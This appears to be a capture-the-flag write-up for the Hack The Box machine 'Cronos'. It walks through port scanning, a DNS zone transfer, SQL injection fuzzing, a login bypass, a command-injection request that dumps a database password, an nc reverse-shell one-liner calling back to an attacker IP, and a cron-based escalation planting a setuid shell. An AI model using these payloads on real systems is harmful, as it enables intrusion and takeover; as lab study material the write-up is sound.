###  Cronos

#### information

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### recon

**dns**

 dig -t axfr  cronos.htb @10.10.10.13

; <<>> DiG 9.11.5-P4-1-Debian <<>> -t axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800

**www**

as we see that "http://admin.cronos.htb/"  is a login page, so try to sql to test if hava  something interesting. 

 wfuzz -w /usr/share/wordlists/SecLists/Fuzzing/Generic-SQLi.txt  -d 'username=FUZZ&password=password' -u http://admin.cronos.htb  --hw 221

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fup

000065:  C=302     98 L      215 W         2580 Ch        "admin' or '"
000201:  C=302     98 L      215 W         2580 Ch        "x' or 1=1 or 'x'='y"
000216:  C=200     98 L      221 W         2618 Ch        "declare @q nvarchar (200) select @q = 0x770061006900740066006F00720020006400000217:  C=200     98 L      221 W         2618 Ch        "declare @s varchar(200) select @s 



**<span style="font:16">Bingo</span>**  we got the sql injection , seccessufly login with **username=admin'-- -&password=pass**

now we get het welcome.php  page, it's a web api page to execute command.

POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://admin.cronos.htb/welcome.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Cookie: PHPSESSID=p3kscfgr9a96ut1ulk74qejcl0
Connection: close
Upgrade-Insecure-Requests: 1

command=traceroute&host=8.8.8.8%3Bcat+config.php



define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'admin');
define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
define('DB_DATABASE', 'admin');
$db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

and try to cat /etc/passwd , get the root, www-data, noulis users.

connect ssh with kEjdbRigfBHUREiNSDs , but unfortunately , we faild.

try reverse shell with nc :

​	command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.27+8000+>/tmp/f

and Enum this machine, found that cron job 

* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

Boom! we can get the shell

echo '<?php system("cp /bin/dash /tmp/shell; chmod 4755 /tmp/shell"); ?>' > artisan